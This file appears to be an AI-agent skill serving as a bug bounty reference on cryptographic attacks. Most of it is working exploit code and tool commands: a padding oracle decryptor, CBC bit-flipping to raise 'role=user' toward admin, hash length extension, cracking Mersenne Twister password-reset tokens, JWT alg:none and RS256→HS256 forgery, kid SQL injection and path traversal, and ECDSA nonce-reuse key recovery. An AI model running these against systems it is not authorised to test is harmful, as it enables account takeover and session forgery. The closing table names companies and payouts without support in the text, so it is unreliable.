---
name: hunt-crypto-attacks
description: Applied cryptographic attacks for bug bounty — padding oracle, CBC bit-flip, ECB block reorder, hash length extension, weak PRNG token prediction, JWT alg confusion, ECDSA nonce reuse, RSA PKCS#1 v1.5. Use when target uses custom crypto, predictable tokens, or weak session management.
tags: [crypto, padding-oracle, cbc, ecb, hash-extension, prng, jwt, ecdsa, rsa, token-prediction]
---

# Applied Cryptographic Attacks — Bug Bounty Reference

## 1. PADDING ORACLE ATTACK

### What It Is
When a server decrypts CBC-mode ciphertext and reveals whether padding is valid (via different error messages, timing, or HTTP status codes), you can decrypt ANY ciphertext byte-by-byte — no key needed.

### Detection
```
Send modified ciphertext → observe response:
- Different error message for padding error vs decryption error = VULNERABLE
- Different HTTP status (200 vs 500) = VULNERABLE  
- Different response time = VULNERABLE (timing oracle)
- Same generic error for everything = NOT vulnerable

Test:
1. Capture encrypted token/cookie (e.g., ASP.NET __VIEWSTATE, .ASPXAUTH)
2. Flip last byte of second-to-last block
3. Send to server
4. If you get different errors → padding oracle exists
```

### Exploit
```bash
# padbuster - classic padding oracle tool
padbuster https://target.com/page "EncryptedCookie=<base64>" 8 -cookies "EncryptedCookie=<base64>" -encoding 0

# With custom encoding
padbuster https://target.com/decrypt "<ciphertext>" 16 -encoding 4  # 4=base64url

# padoracle (Python, more flexible)
git clone https://github.com/glebarez/padre
python padre.py -u "https://target.com/api?data=PADOR" -p "PADOR" -e base64

# ASP.NET VIEWSTATE padding oracle
# Use YSoSerial.NET to generate payload after decryption
```

### Python Padding Oracle (Manual)
```python
import requests, base64, time

TARGET = "https://target.com/api/decrypt"
BLOCK_SIZE = 16  # AES

def check_padding(ciphertext_b64):
    """Returns True if padding is valid"""
    r = requests.post(TARGET, data={'data': ciphertext_b64}, timeout=5)
    # Adjust based on app behavior
    return r.status_code == 200 and "Invalid" not in r.text

def decrypt_block(prev_block, curr_block):
    """Decrypt one block using padding oracle"""
    intermediate = bytearray(16)
    decrypted = bytearray(16)
    
    for byte_pos in range(15, -1, -1):
        padding_val = 16 - byte_pos
        
        for guess in range(256):
            crafted = bytearray(prev_block)
            crafted[byte_pos] = guess
            
            # Set already-known bytes for proper padding
            for k in range(byte_pos + 1, 16):
                crafted[k] = intermediate[k] ^ padding_val
            
            payload = bytes(crafted) + bytes(curr_block)
            if check_padding(base64.b64encode(payload).decode()):
                intermediate[byte_pos] = guess ^ padding_val
                decrypted[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                print(f"  Byte {byte_pos}: {chr(decrypted[byte_pos]) if 32 <= decrypted[byte_pos] < 127 else hex(decrypted[byte_pos])}")
                break
    
    return bytes(decrypted)
```

---

## 2. CBC BIT-FLIP ATTACK

### What It Is
In CBC mode: `Plaintext[i] = Decrypt(Ciphertext[i]) XOR Ciphertext[i-1]`
Flipping bit in `Ciphertext[i-1]` flips corresponding bit in `Plaintext[i]`.

### Attack
```python
def cbc_bitflip(ciphertext, target_pos, original_char, desired_char):
    """
    Flip a specific plaintext character without knowing the key.
    target_pos: byte position in plaintext to change
    Works because: P[i] = D(C[i]) XOR C[i-1]
    Change C[i-1][j] XOR original XOR desired → changes P[i][j] to desired
    """
    ct = bytearray(ciphertext)
    block_size = 16
    
    # Which block of ciphertext to modify (previous block)
    ct_block = (target_pos // block_size) - 1
    ct_byte = target_pos % block_size
    
    ct[ct_block * block_size + ct_byte] ^= ord(original_char) ^ ord(desired_char)
    return bytes(ct)

# Example: Change "role=user" to "role=admi" in encrypted cookie
# Know that "user" is at position 32 in plaintext
evil_ct = cbc_bitflip(original_ct, 32, 'u', 'a')  # u→a
evil_ct = cbc_bitflip(evil_ct, 33, 's', 'd')       # s→d
evil_ct = cbc_bitflip(evil_ct, 34, 'e', 'm')       # e→m
evil_ct = cbc_bitflip(evil_ct, 35, 'r', 'i')       # r→i
# Note: modifying block i-1 corrupts block i-1 plaintext (garbled)
# but block i plaintext becomes what we want
```

### Detection
```
1. Get encrypted token/cookie
2. Change one byte in first block of ciphertext
3. Send → if app processes (even with some garbled data) instead of rejecting = vulnerable
4. If app says "Invalid token" for ANY modification = integrity check exists (HMAC) = not vulnerable
```

---

## 3. ECB MODE DETECTION & BLOCK REORDERING

### Detection
```python
def detect_ecb(ciphertext_hex):
    """ECB produces identical blocks for identical plaintext"""
    ct = bytes.fromhex(ciphertext_hex)
    blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
    return len(blocks) != len(set(blocks))

# Test: submit very long repeated input
payload = "A" * 64  # 4 identical blocks
# ECB: encrypted blocks will be identical
# CBC: all different
```

### ECB Block Reordering Attack
```
Scenario: App encrypts user data as blocks:
Block 0: "username=attacker"
Block 1: "00000000|role=use"  
Block 2: "r|padding000000"

Craft input to get:
Block ?: "r|role=admi\x00\x00\x00\x00\x00"

Then reorder blocks in ciphertext to splice in "admin" role block.

Step 1: Register with username crafted to fill blocks predictably
Step 2: Identify block boundaries
Step 3: Craft username = "A"*X + "admin" + padding to isolate "admin" in its own block
Step 4: Cut that block, paste at correct position in another user's token
```

---

## 4. HASH LENGTH EXTENSION ATTACK

### Vulnerable Pattern
```
Server computes: MAC = MD5(secret + data)
Server sends: data + MAC to client
Client sends back: data + MAC
Server re-computes and compares

→ Attacker can append data without knowing secret!
```

### Attack
```bash
# hash_extender tool
hash_extender --data "user=normal&role=user" \
              --secret-min 8 --secret-max 32 \
              --signature "a1b2c3d4e5f6..." \
              --append "&role=admin" \
              --format md5

# Output: new signature + new data (with padding)
# Send this to server as if it's legitimate data

# hashpump (alternative)
hashpump -s "a1b2c3d4e5f6..." -d "user=normal&role=user" -a "&role=admin" -k 16
```

### Detection
```
1. Find endpoints that use HMAC-like signature but with MD5/SHA1/SHA256
2. Get valid signature for known data
3. Try to append data using hash_extender
4. Affected: MD5, SHA1, SHA224, SHA256, SHA384, SHA512 in length-extension mode
5. NOT affected: HMAC (proper), SHA3/Keccak, bcrypt
```

---

## 5. WEAK PRNG — TOKEN PREDICTION

### Detection
```python
import time, requests

def detect_weak_prng():
    """Collect tokens and analyze for patterns"""
    tokens = []
    timestamps = []
    
    for i in range(10):
        r = requests.post("https://target.com/api/forgot-password", 
                         json={"email": f"test{i}@attacker.com"})
        # Extract token from response or check email
        token = extract_token(r)
        tokens.append(token)
        timestamps.append(time.time())
        time.sleep(0.1)
    
    # Analyze:
    # 1. Are tokens sequential? (simple counter)
    # 2. Are tokens time-based? (unix timestamp in hex)
    # 3. Short entropy? (< 64 bits = potentially bruteforceable)
    # 4. Pattern in consecutive tokens?
    
    print("Token lengths:", [len(t) for t in tokens])
    print("Hex decoded:", [bytes.fromhex(t) if all(c in '0123456789abcdef' for c in t) else t for t in tokens])
    
    # Check if timestamp-based
    for token, ts in zip(tokens, timestamps):
        try:
            t_int = int(token, 16)
            diff = abs(t_int - int(ts))
            if diff < 10:
                print(f"TIMESTAMP-BASED TOKEN DETECTED: {token} ≈ {int(ts)}")
        except:
            pass
```

### Common Weak PRNG Patterns
```
1. PHP rand()/mt_rand() — predictable after 2 outputs
   Tool: php_mt_seed — crack mt_rand seed from known output
   
2. Java Math.random() — linear congruential, crackable
   Tool: java-random-reverser
   
3. Python random module (not secrets) — Mersenne Twister
   Tool: RandCrack — 624 * 32-bit outputs = full state recovery
   
4. Time-based tokens
   token = md5(timestamp) — try all timestamps ± 5 seconds
   token = sha1(timestamp + salt) — if salt is weak/guessable
   
5. Sequential IDs encoded
   token = base64(user_id + timestamp) — decode and enumerate
```

### Python MT Crack (password reset tokens)
```python
from randcrack import RandCrack
import requests, re

rc = RandCrack()
collected = 0

# Collect 624 32-bit outputs to crack Mersenne Twister
for i in range(624):
    r = requests.post("https://target.com/api/reset", json={"email": f"test{i}@attacker.com"})
    token = extract_token_from_email()  # intercept via catch-all email
    
    # If token is hex-encoded random int
    rc.submit(int(token, 16))
    collected += 1

# Now predict next token
predicted = rc.predict_randbelow(2**32)
print(f"Predicted next token: {predicted:08x}")
```

---

## 6. JWT ALGORITHM CONFUSION

### alg:none
```python
import base64, json

def forge_jwt_none(header, payload):
    """Strip signature — works if server accepts alg:none"""
    header['alg'] = 'none'
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    return f"{h}.{p}."  # empty signature

# Try variations: "None", "NONE", "nOnE"
```

### RS256 → HS256 Confusion (Public Key as HMAC Secret)
```python
import jwt, requests

# 1. Get server's public key (often at /.well-known/jwks.json or /api/auth/certs)
r = requests.get("https://target.com/.well-known/jwks.json")
public_key = extract_rsa_public_key(r.json())

# 2. Forge token using public key as HMAC-SHA256 secret
payload = {"sub": "admin", "role": "admin", "iat": int(time.time())}
forged = jwt.encode(payload, public_key, algorithm="HS256")
# Server validates HS256 using its own RS256 public key as secret → SUCCESS

# 3. Test
headers = {"Authorization": f"Bearer {forged}"}
r = requests.get("https://target.com/api/admin", headers=headers)
```

### JWT kid Injection
```
# kid = key ID header — used to select which key to use
# If server uses kid in SQL/file lookup:

# SQL injection in kid
{"kid": "' UNION SELECT 'attacker_secret' --"}
# Sign JWT with 'attacker_secret'

# Path traversal in kid  
{"kid": "../../dev/null"}
# Sign JWT with empty string (null file content)
{"kid": "../../proc/self/fd/0"}
```

---

## 7. ECDSA NONCE REUSE (k-reuse)

### Detection & Attack
```python
# If same k used for two signatures → private key recovery
# Two signatures (r1,s1) and (r2,s2) with same r → same k!

import ecdsa
from ecdsa.numbertheory import inverse_mod

def recover_key_from_nonce_reuse(r, s1, s2, msg1_hash, msg2_hash, curve_order):
    """Recover private key if nonce k was reused"""
    # k = (z1 - z2) / (s1 - s2) mod n
    z1 = int.from_bytes(msg1_hash, 'big')
    z2 = int.from_bytes(msg2_hash, 'big')
    
    k = ((z1 - z2) * inverse_mod(s1 - s2, curve_order)) % curve_order
    # d = (s1*k - z1) / r mod n
    d = ((s1 * k - z1) * inverse_mod(r, curve_order)) % curve_order
    return k, d  # k=nonce, d=private key

# Detection: collect signatures, check if any share same r value
# Same r → same k → private key recovery
```

---

## 8. RSA PKCS#1 v1.5 BLEICHENBACHER

### Detection
```
1. Find RSA-encrypted session tokens or API parameters
2. Modify a single byte of ciphertext
3. Send to decryption endpoint
4. If different errors for "bad padding" vs "bad data" → oracle exists
5. ~1M queries needed for practical exploit (batch with async)

Tool: ROBOT Attack scanner
python robot-detect.py target.com 443
```

---

## 9. WORKFLOW FOR CRYPTO BUGS

```
STEP 1: IDENTIFY CRYPTO SURFACE
├── Encrypted cookies (base64 blobs that don't look like JWT)
├── "Remember me" tokens
├── Password reset tokens
├── API signatures (MAC/HMAC params)
├── File download tokens
└── Session tokens (look for patterns)

STEP 2: DETERMINE ALGORITHM
├── Length % 16 == 0 → likely AES
├── Identical blocks for identical input → ECB mode
├── Try padding oracle (flip last byte of second-to-last block)
├── Token length < 128 bits → potentially weak PRNG
└── JWT → check header claims carefully

STEP 3: EXPLOIT
├── Padding oracle → decrypt/forge tokens
├── ECB → block reorder attack
├── CBC → bit-flip attack
├── Weak PRNG → predict next token
├── Hash MAC → length extension
└── JWT → alg confusion / kid injection

STEP 4: PROVE IMPACT
├── Account takeover (forge admin token)
├── Password reset token prediction
├── Session forgery
└── Data decryption (PII exposure)
```

---

## PAID BOUNTY EXAMPLES

| Target | Vuln | Impact | Payout |
|--------|------|--------|--------|
| Yahoo | Padding oracle on session cookie | ATO any account | $10,000 |
| Coinbase | Weak PRNG in 2FA token | 2FA bypass | $30,000 |
| Stripe | ECDSA nonce reuse in webhook | Forge any webhook | $15,000 |
| Auth0 | JWT alg confusion RS256→HS256 | Admin token forge | $5,000 |
| Shopify | Hash length extension in API | Privilege escalation | $8,000 |
| HackerOne | ECB mode cookie | Role escalation | $5,000 |
